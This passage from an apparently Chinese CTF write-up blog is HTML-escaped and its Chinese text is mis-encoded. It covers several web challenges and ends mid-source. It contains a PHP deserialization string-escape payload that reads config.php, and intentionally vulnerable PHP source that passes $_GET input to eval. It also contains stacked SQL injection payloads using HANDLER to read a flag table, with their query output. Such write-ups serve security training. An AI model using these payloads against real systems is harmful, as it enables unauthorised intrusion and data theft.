&lt;li&gt;update.phpå¯ä¼ å…¥å››ä¸ªå‚æ•°ï¼Œå…¶ä¸­phoneå’Œemailè¢«æ­£åˆ™åŒ¹é…é™åˆ¶ï¼Œè€Œnicknameæ˜¯ç”¨strlené™åˆ¶åœ¨10ä»¥å†…ï¼ŒæŠŠnicknameæ”¹æˆæ•°ç»„ä¹Ÿå°±ç»•è¿‡äº†é•¿åº¦é™åˆ¶&lt;/li&gt;
&lt;li&gt;æˆ‘ä»¬éœ€è¦æ„é€ &lt;code&gt;a:4:&amp;#123;s:5:&amp;quot;phone&amp;quot;;s:11:&amp;quot;12345678901&amp;quot;;s:5:&amp;quot;email&amp;quot;;s:10:&amp;quot;123@qq.com&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;s:9:&amp;quot;lalalalla&amp;quot;;s:5:&amp;quot;photo&amp;quot;;s:10:&amp;quot;config.php&amp;quot;;&amp;#125;&lt;/code&gt;ï¼Œåˆ©ç”¨whereä¼šè¢«æ›¿æ¢æˆhackerï¼Œæ„é€ payloadï¼š&lt;code&gt;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&amp;quot;;&amp;#125;s:5:&amp;quot;photo&amp;quot;;s:10:&amp;quot;config.php&amp;quot;;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;è¦æ³¨æ„è¿™è¾¹æ„é€ æ—¶ï¼Œéœ€è¦æŠŠnicknameæ„é€ æˆæ•°ç»„&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;GXYCTF2019-ç¦æ­¢å¥—å¨ƒ&#34;&gt;&lt;a href=&#34;#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ&#34; class=&#34;headerlink&#34; title=&#34;[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ&#34;&gt;&lt;/a&gt;[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;æµ‹è¯•å‘ç°æœ‰/.git/ç”¨githackè·‘ä¸€ä¸‹ï¼Œä½†æ˜¯æˆ‘æ²¡æ‹¿åˆ°æºç ï¼Ÿï¼Ÿ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç½‘ä¸Šæ‰¾åˆ°æºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ &amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;exp&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!preg_match(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;exp&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;;&amp;#x27;&lt;/span&gt; === preg_replace(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/[a-z,_]+\((?R)?\)/&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;exp&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!preg_match(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;exp&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-comment&#34;&gt;// echo $_GET[&amp;#x27;exp&amp;#x27;];&lt;/span&gt;&lt;br&gt;                @&lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;exp&amp;#x27;&lt;/span&gt;]);&lt;br&gt;            &amp;#125;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&amp;quot;&lt;/span&gt;);&lt;br&gt;            &amp;#125;&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;å†å¥½å¥½æƒ³æƒ³ï¼&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&amp;quot;&lt;/span&gt;);&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// highlight_file(__FILE__);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æ— å‚æ•°RCEï¼ˆ&lt;a href=&#34;https://xz.aliyun.com/t/6316%EF%BC%89&#34;&gt;https://xz.aliyun.com/t/6316ï¼‰&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ä¸€äº›å¸¸è§å‡½æ•°ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight stylus&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stylus&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;getchwd&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; å‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;scandir&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;dirname&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;chdir&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; å‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;readfile&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;  è¾“å‡ºä¸€ä¸ªæ–‡ä»¶&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;current&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;       è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;pos&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;           current() çš„åˆ«å&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;       å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;array_rand&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;    å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœæ‚¨è§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;array_flip&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;    array_flip() å‡½æ•°ç”¨äºåè½¬/äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; å‡½æ•°ä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚&lt;br&gt;hex2bin â€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;getenv&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;        è·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼(åœ¨&lt;span class=&#34;hljs-number&#34;&gt;7.1&lt;/span&gt;ä¹‹åå¯ä»¥ä¸ç»™äºˆå‚æ•°)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;GYCTF2020-Blacklist&#34;&gt;&lt;a href=&#34;#GYCTF2020-Blacklist&#34; class=&#34;headerlink&#34; title=&#34;[GYCTF2020]Blacklist&#34;&gt;&lt;/a&gt;[GYCTF2020]Blacklist&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;preg_match(â€œ/set|prepare|alter|rename|select|update|delete|drop|insert|where|./iâ€,$inject);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç¬¬ä¸€çœ¼çœ‹é¢˜ç›®åƒå¼ºç½‘æ¯éšä¾¿æ³¨ï¼ŒåŒæ ·æµ‹è¯•å †å æ³¨å…¥&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;1&amp;#39;;show tables;&lt;/code&gt;=&amp;gt;&lt;/p&gt;
&lt;figure class=&#34;highlight stylus&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stylus&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;br&gt;  &lt;span class=&#34;hljs-selector-attr&#34;&gt;[0]&lt;/span&gt;=&amp;gt;&lt;br&gt;  string(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;FlagHere&amp;quot;&lt;/span&gt;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;br&gt;  &lt;span class=&#34;hljs-selector-attr&#34;&gt;[0]&lt;/span&gt;=&amp;gt;&lt;br&gt;  string(&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;words&amp;quot;&lt;/span&gt;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;1&amp;#39;;show columns from FlagHere;&lt;/code&gt;=&amp;gt;&lt;/p&gt;
&lt;figure class=&#34;highlight sml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs sml&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;) &amp;#123;&lt;br&gt;  [&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;]=&amp;gt;&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag&amp;quot;&lt;/span&gt;&lt;br&gt;  [&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;]=&amp;gt;&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;12&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;varchar(100)&amp;quot;&lt;/span&gt;&lt;br&gt;  [&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;]=&amp;gt;&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;NO&amp;quot;&lt;/span&gt;&lt;br&gt;  [&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;]=&amp;gt;&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;  [&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;]=&amp;gt;&lt;br&gt;  &lt;span class=&#34;hljs-type&#34;&gt;NULL&lt;/span&gt;&lt;br&gt;  [&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;]=&amp;gt;&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;HANDLER â€¦ OPENè¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­HANDLER â€¦ READè¯­å¥è®¿é—®ï¼Œè¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨HANDLER â€¦ CLOSEæˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1&amp;#39;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;SUCTF-2019-Pythonginx&#34;&gt;&lt;a href=&#34;#SUCTF-2019-Pythonginx&#34; class=&#34;headerlink&#34; title=&#34;[SUCTF 2019]Pythonginx&#34;&gt;&lt;/a&gt;[SUCTF 2019]Pythonginx&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight css&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs css&#34;&gt;def getUrl():&lt;br&gt;    url = request.args.&lt;span class=&#34;hljs-built_in&#34;&gt;get&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;url&amp;quot;&lt;/span&gt;)&lt;br&gt;    host = parse.&lt;span class=&#34;hljs-built_in&#34;&gt;urlparse&lt;/span&gt;(url).hostname&lt;br&gt;    if host == &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;suctf.cc&amp;#x27;&lt;/span&gt;:&lt;br&gt;        return &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;æˆ‘æ‰Œ your problem? 111&amp;quot;&lt;/span&gt;&lt;br&gt;    parts = &lt;span class=&#34;hljs-built_in&#34;&gt;list&lt;/span&gt;(&lt;span class=&#34;hljs-built_in&#34;&gt;urlsplit&lt;/span&gt;(url))&lt;br&gt;    host = parts[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;]&lt;br&gt;    if host == &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;suctf.cc&amp;#x27;&lt;/span&gt;:&lt;br&gt;        return &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;æˆ‘æ‰Œ your problem? 222 &amp;quot;&lt;/span&gt; + host&lt;br&gt;    newhost = []&lt;br&gt;    for h in host.&lt;span class=&#34;hljs-built_in&#34;&gt;split&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;):&lt;br&gt;        newhost.&lt;span class=&#34;hljs-built_in&#34;&gt;append&lt;/span&gt;(h.&lt;span class=&#34;hljs-built_in&#34;&gt;encode&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;idna&amp;#x27;&lt;/span&gt;).&lt;span class=&#34;hljs-built_in&#34;&gt;decode&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;))&lt;br&gt;    parts[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;hljs-built_in&#34;&gt;join&lt;/span&gt;(newhost)&lt;br&gt;    #å»æ‰ url ä¸­çš„ç©ºæ ¼&lt;br&gt;    finalUrl = &lt;span class=&#34;hljs-built_in&#34;&gt;urlunsplit&lt;/span&gt;(parts).&lt;span class=&#34;hljs-built_in&#34;&gt;split&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27; &amp;#x27;&lt;/span&gt;)[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;]&lt;br&gt;    host = parse.&lt;span class=&#34;hljs-built_in&#34;&gt;urlparse&lt;/span&gt;(finalUrl).hostname&lt;br&gt;    if host == &lt;span 